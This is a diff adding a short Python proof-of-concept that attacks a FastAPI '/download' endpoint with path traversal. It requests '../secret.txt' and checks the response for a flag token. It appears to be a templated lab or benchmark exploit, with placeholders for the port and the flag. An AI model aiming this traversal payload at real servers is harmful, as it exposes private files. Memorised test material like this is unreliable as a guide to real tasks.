@@ -1,0 +1,31 @@
+import argparse
+import sys
+import requests
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_PATH = '../secret.txt'
+
+def exploit(base_url: str, target_path: str) -> bool:
+    url = base_url.rstrip('/') + '/download'
+    try:
+        resp = requests.get(url, params={'path': target_path}, timeout=5)
+    except requests.RequestException as exc:
+        print(f'[path-traversal-fastapi-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    return resp.status_code == 200 and FLAG_TOKEN in (resp.text or '')
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Path Traversal compiler PoC (FastAPI)')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PATH)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[path-traversal-fastapi-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
